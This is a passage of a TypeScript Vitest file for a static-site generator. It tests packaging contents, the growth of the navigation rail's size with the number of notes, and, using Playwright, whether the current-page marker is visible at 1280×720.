  // config template. Doc comments in this repository's own sources are not that.
  const manifest = JSON.parse(readFileSync(join(ROOT, 'package.json'), 'utf8')) as { name: string };
  const scope = manifest.name.replace(/^@/, '').split('/')[0]!;

  for (const [what, text] of [
    ['the .gitignore header', SEEDED_HEADER],
    ['the config template', CONFIG_TEMPLATE],
  ] as const) {
    assert.ok(!text.includes(manifest.name), `${what} carries the package name`);
    assert.ok(
      !new RegExp(scope, 'i').test(text),
      `${what} carries this project's name, which a stranger's repository must not acquire`,
    );
  }

  // Non-vacuity: the scan has to be capable of finding the name. Without this a
  // typo in the pattern reads as a clean result — `docs/gate-reading.md` case 4.
  assert.match(
    `a line mentioning ${scope} here`,
    new RegExp(scope, 'i'),
    'the scan cannot find the name even when it is present, so its zero means nothing',
  );
});
test('action.yml is in no tarball this package produces', () => {
  // `action.yml` is consumed by `uses:` from a git ref and is meaningless inside
  // `node_modules`. `package.json`'s `files` is a **glob allowlist**, which is
  // what makes the obvious check wrong: an earlier version compared each entry
  // against the literal string `action.yml` with `startsWith`, and a reviewer
  // showed it passes for `"*.yml"`, `"action*"`, and every other glob that would
  // actually pack the file. A prefix test cannot answer a glob question.
  //
  // So the packer is run and the staged tree is inspected — the same instrument
  // `tests/packaging.test.ts` uses, for the same reason: what ships is a fact
  // about the output, not about the manifest. `docs/gate-reading.md` case 5.
  //
  // **What this measures and what it does not.** `compilePackage` stages each
  // `files` entry as a literal path — `existsSync` then `cpSync` — so a *glob*
  // added to the manifest stages nothing here, measured: with `"*.yml"` in
  // `files` this gate stays green while `npm pack`, which does expand globs,
  // would carry the file. The gate is over the artifact this repository's own
  // release step produces, which is the one a consumer installs; a manifest glob
  // is a divergence between two packers and belongs to whoever changes `files`
  // to use one. Verified against the literal spelling, which is the shape a
  // person tidying the manifest actually writes: it turns this red.
  const staged = mkdtempSync(join(tmpdir(), 'tk32-pack-'));
  try {
    compilePackage(staged);
    const packed = filesUnder(staged).map((file) => file.slice(staged.length + 1).replaceAll('\\', '/'));
    assert.ok(packed.length > 0, 'the packer staged nothing, so this scan looked at no files');
    assert.ok(
      packed.includes('package.json'),
      'the staged tree has no package.json, so it is not the artifact this gate means to inspect',
    );
    assert.deepEqual(
      packed.filter((file) => file.endsWith('action.yml')),
      [],
      'action.yml is packed into the tarball, where `uses:` cannot reach it and it does nothing',
    );
  } finally {
    rmSync(staged, { recursive: true, force: true });
  }
});

/* --------------------------------------------------------------- scale -- */

/**
 * The rail's per-page cost is bounded per collection rather than per corpus note.
 *
 * **The defect this closes was quadratic and it landed on the user's bill.** The
 * explorer renders on every page and listed every published note, so a site paid
 * n entries × n pages. Measured through this binary before the bound: 100 notes
 * gave a 7,817 B rail on a 17,245 B page, and 300 gave 23,126 B on 32,566 B —
 * 71% of what a reader downloaded was a list of the pages they had not asked
 * for. At 77 B/entry that is 732 KB per page across 10,000 pages.
 *
 * **Built rather than modelled, and built by the shipped binary.** The rail is
 * markup, so the claim is about output — `docs/gate-reading.md` case 5. It is
 * also the CLI's own corpus shape that matters. Root-level notes form the
 * uncollected group, and a bound applied only to collection facets would leave
 * that ordinary corpus unbounded while every collection fixture stayed green.
 *
 * **Two sizes, because one measures a constant and two measure growth.** A fix
 * that improved the constant and kept the slope would pass any single-size
 * check. The sizes are 60 and 400 — far enough apart that a per-page cost still
 * proportional to the corpus cannot hide in the noise, and small enough that two
 * full builds stay inside one test; `scripts/generate-corpus.ts` produces both
 * from one seed.
 *
 * **Sequential with the rendered gate below, and that is a measurement rather
 * than tidiness.** Each of the two runs a whole Astro build, and run
 * concurrently they took enough CPU to push `tests/math-and-diagrams.test.ts`
 * past the 30 s `testTimeout` — on a file that finishes in 17 s alone — and to
 * redden `tests/backlink-surfaces.test.ts`, which builds its own fixture. Both
 * were flakes in neighbours rather than defects in either file, and both
 * disappeared under `--no-file-parallelism`. `concurrent: false` buys the same
 * result for these two without slackening the global timeout, which would
 * loosen every gate in the repository to settle one. Spelled as the option
 * rather than as `describe.sequential`, which Vitest 4 deprecates in favour of
 * exactly this — `astro check` reports the chained form as `ts(6385)`.
 */
describe('rail scale', { concurrent: false }, () => {
test('the explorer bounds every collection independently of corpus size', () => {
  /** The rail's own bytes and links on one built page. */
  const railOf = (html: string): { bytes: number; links: number; counts: number[] } | undefined => {
    const start = html.indexOf('<nav class="explorer"');
    if (start < 0) return undefined;
    const end = html.indexOf('</nav>', start);
    const rail = html.slice(start, end + '</nav>'.length);
    return {
      bytes: Buffer.byteLength(rail, 'utf8'),
      links: (rail.match(/<li><a href="\/notes\//g) ?? []).length,
      // The number beside each group's label, which must be the collection's
      // size and not the window's.
      counts: [...rail.matchAll(/<span class="explorer-count">(\d+)<\/span>/g)].map(([, n]) => Number(n)),
    };
  };

  /** Build `notes` synthetic notes through the binary and measure one note page. */
  const measure = (notes: number): { bytes: number; links: number; counts: number[]; pages: number; cards: number } =>
    scratch(`tk36-scale-${notes}-`, (root) => {
      const corpus = join(root, 'notes');
      mkdirSync(corpus, { recursive: true });
      // Awaited through a subprocess rather than by making this test async:
      // `generateCorpus` is async and this file's `scratch` helper is not.
      // `pathToFileURL` rather than a separator replacement — an import
      // specifier on win32 is a URL, and `Q:\repos\…` is not one.
      const generate = spawnSync(
        process.execPath,
        [
          '--input-type=module',
          '-e',
          `import { generateCorpus } from ${JSON.stringify(pathToFileURL(join(ROOT, 'scripts/generate-corpus.ts')).href)};` +
            `await generateCorpus(${JSON.stringify(corpus)}, { notes: ${notes}, seed: 7 });`,
        ],
        { encoding: 'utf8' },
      );
      assert.equal(generate.status, 0, `corpus generation failed:\n${generate.stdout}${generate.stderr}`);

      const build = cli(root, 'build', '--content', 'notes', '--out', 'dist');
      assert.equal(build.status, 0, `the ${notes}-note build failed:\n${build.output}`);

      const noteDirectory = join(root, 'dist', 'notes');
      const slugs = readdirSync(noteDirectory);
      // A note page rather than the home page: the home page opens no group, so
      // its rail is closed disclosures and would measure the wrong thing.
      const rail = railOf(readFileSync(join(noteDirectory, slugs[0]!, 'index.html'), 'utf8'));
      assert.ok(rail, `the ${notes}-note build renders no rail at all, so nothing was measured`);
      // The home page is the *only* surface listing every note once the rail is
      // windowed, so it is the last link of the reachability argument — and it
      // was the ungated one. `tests/built-routes.test.ts` asserts the note grid
      // covers the corpus, but behind `requireMultiEntry`. Counted here too, on
      // the build this scale gate already paid for.
      const home = readFileSync(join(root, 'dist', 'index.html'), 'utf8');
      const cards = (home.match(/<article class="note-card">/g) ?? []).length;
      return { ...rail, pages: slugs.length, cards };
    })!;

  const small = measure(60);
  const large = measure(400);

  // Non-vacuity in the only direction that matters: the corpora really do differ
  // in size, so an equal rail is a bound rather than two runs of one corpus.
  assert.ok(
    large.pages > small.pages * 4,
    `the two builds produced ${small.pages} and ${large.pages} note pages — they are not different corpora`,
  );

  // Each group contributes at most one window. The number of first-folder
  // collections may grow, but adding notes to an existing group cannot make its
  // rail slice grow past the declared bound.
  for (const [name, built] of [
    ['small', small],
    ['large', large],
  ] as const) {
    const expectedLinks = built.counts.reduce((sum, count) => sum + Math.min(count, GROUP_WINDOW), 0);
    assert.equal(
      built.links,
      expectedLinks,
      `${name} rail draws ${built.links} note links for groups ${JSON.stringify(built.counts)}; ` +
        `the per-group bound predicts ${expectedLinks}`,
    );
    assert.equal(
      built.counts.reduce((sum, count) => sum + count, 0),
      built.pages,
      `${name} rail group counts do not partition the ${built.pages} published notes`,
    );
  }
  assert.ok(
    large.bytes < small.bytes * 1.5,
    `the rail is ${small.bytes} B on the small corpus and ${large.bytes} B on the large one — ` +
      'bounded groups still leave bytes growing with notes',
  );
  assert.ok(
    large.counts.some((count) => count > GROUP_WINDOW),
    'no large-corpus group exceeds the window, so the bound was not exercised',
  );

  // **Nothing became unreachable.** Collection windows expand through their
  // collection indexes; the uncollected window expands through the home page,
  // which still lists every published note. Checked at both sizes because a grid
  // that silently paginated past some threshold would satisfy the small one alone.
  for (const [size, built] of [
    [small.pages, small.cards],
    [large.pages, large.cards],
  ] as const) {
    assert.equal(
      built,
      size,
      `the home page lists ${built} of ${size} published notes — the rail is windowed, so a home ` +
        'page that does not list the whole corpus makes the missing notes unreachable',
    );
  }
}, 600_000);

/**
 * The reader's own position in the rail is on screen without scrolling the rail.
 *
 * **This is what made the bound a correctness fix rather than only a bytes fix,
 * and it is measured in a browser because no other instrument can see it.** The
 * rail's whole contextual claim is `aria-current="page"` — three non-colour
 * signals in `global.css` and an announcement to a screen reader. But the rail
 * is `max-height: calc(100vh - 7rem)` with `overflow-y: auto`, so past its own
 * row budget that marker renders *below the fold of its own scroll container*:
 * present in the markup, invisible to the reader, and every string gate in this
 * repository green about it.
 *
 * Measured through the shipped binary before the bound, at 1280×720 over 40 note
 * pages: at 100 notes 31 of 40 put the marker outside the visible box, and at
 * 300 notes 40 of 40 did. A reader on a 300-note site was shown a wall of titles
 * that never contained the one they were reading.
 *
 * 1280×720 because it is the smallest viewport at which the rail is a column at
 * all — the two-column layout switches on at 64rem — and so the one with the
 * fewest visible rows. A gate at 1440×900 would have 21 rows to play with and
 * would pass a window this one refuses.
 *
 * **This is the only instrument that constrains `GROUP_WINDOW`'s value.** Every
 * other gate over the window asserts its *shape* — centred, clamped, `total`
 * distinct from the drawn slice — and is deliberately written in terms of the
 * constant, so all of them stay green at any value. Measured: with the window at
 * 40, `tests/collection-navigation.test.ts` is 20 of 20 green and only this test
 * goes red. Anyone deleting or weakening it is removing the whole basis for the
 * number, which is why it must report "could not look" as a skip rather than as
 * a pass — `docs/gate-reading.md` case 3.
 */
test('the rail shows the reader their own position without scrolling', async (context) => {
  const { chromium } = await import('playwright');
  let executable: string | undefined;
  try {
    executable = chromium.executablePath();
  } catch {
    executable = undefined;
  }
  if (executable === undefined || !existsSync(executable)) {
    // `context.skip` with the reason, not a bare `return` — which Vitest records
    // as **passed**, so a host with no browser would report the one gate behind
    // this bound as green having measured nothing. That is exactly the shape
    // `docs/gate-reading.md` case 3 names: "could not look" must not be spelled
    // like "looked and found nothing". `tests/rendered-page.test.ts` reaches the
    // same place through its own `requireBrowser`.
    return context.skip('run `pnpm exec playwright install chromium` for the rendered rail gate');
  }

  const directory = mkdtempSync(join(tmpdir(), 'tk36-rendered-'));
  const server = createServer((request, response) => {
    let path = join(directory, 'dist', decodeURIComponent((request.url ?? '/').split('?')[0]!));
    if (existsSync(path) && statSync(path).isDirectory()) path = join(path, 'index.html');
    if (!existsSync(path)) {
      response.writeHead(404);
      response.end();
      return;
    }
    response.writeHead(200, {
      'content-type': path.endsWith('.css') ? 'text/css; charset=utf-8' : 'text/html; charset=utf-8',
    });
    response.end(readFileSync(path));
  });

  try {
    const corpus = join(directory, 'notes');
    mkdirSync(corpus, { recursive: true });
    const generate = spawnSync(
      process.execPath,
      [
        '--input-type=module',
        '-e',
        `import { generateCorpus } from ${JSON.stringify(pathToFileURL(join(ROOT, 'scripts/generate-corpus.ts')).href)};` +
          `await generateCorpus(${JSON.stringify(corpus)}, { notes: 300, seed: 7 });`,
      ],
      { encoding: 'utf8' },
    );
    assert.equal(generate.status, 0, `corpus generation failed:\n${generate.stdout}${generate.stderr}`);

    const build = cli(directory, 'build', '--content', 'notes', '--out', 'dist');
    assert.equal(build.status, 0, `the build failed:\n${build.output}`);

    await new Promise<void>((resolve) => server.listen(0, '127.0.0.1', resolve));
    const origin = `http://127.0.0.1:${(server.address() as { port: number }).port}`;

    const browser = await chromium.launch();
    try {
      const page = await browser.newPage({ viewport: { width: 1280, height: 720 } });
      const slugs = readdirSync(join(directory, 'dist', 'notes'));
      // A sample rather than all 285: each navigation is a real page load, and
      // 40 spread across the corpus is enough to have caught the defect at every
      // size it was measured at — it was 40 of 40 failing before the bound.
      const step = Math.max(1, Math.floor(slugs.length / 40));
      const sampled = slugs.filter((_, index) => index % step === 0).slice(0, 40);

      const hidden: string[] = [];
      let checked = 0;
      for (const slug of sampled) {
        await page.goto(`${origin}/notes/${slug}/`, { waitUntil: 'load' });
        const state = await page.evaluate(() => {
          const rail = document.querySelector('.explorer');
          if (rail === null) return 'no-rail';
          const current = rail.querySelector('[aria-current="page"]');
          if (current === null) return 'no-marker';
          const railBox = rail.getBoundingClientRect();
          const markerBox = current.getBoundingClientRect();
          // Inside the rail's own visible box, at the scroll position the reader
          // arrives at. Not `isIntersecting` against the viewport, which would
          // be green for a marker the rail has scrolled out of view.
          return markerBox.top >= railBox.top && markerBox.bottom <= railBox.bottom
            ? 'visible'
            : 'below-the-fold';
        });
        assert.notEqual(state, 'no-rail', `${slug}: renders no rail, so nothing was measured`);
        assert.notEqual(state, 'no-marker', `${slug}: the rail does not mark the note being read`);
        checked += 1;
        if (state !== 'visible') hidden.push(slug);
      }

      // Non-vacuity: a run that navigated nowhere reports zero hidden markers
      // exactly like a run where every marker was visible.
      assert.ok(checked >= 30, `only ${checked} pages were measured, so a clean result proves little`);
      assert.deepEqual(
        hidden,
        [],
        `${hidden.length} of ${checked} pages render aria-current="page" outside the rail's visible ` +
          'box — the reader is shown a list of notes that does not contain the one they are reading',
      );
    } finally {
      await browser.close();
    }
  } finally {
    server.close();
    rmSync(directory, { recursive: true, force: true });
  }
}, 600_000);
});
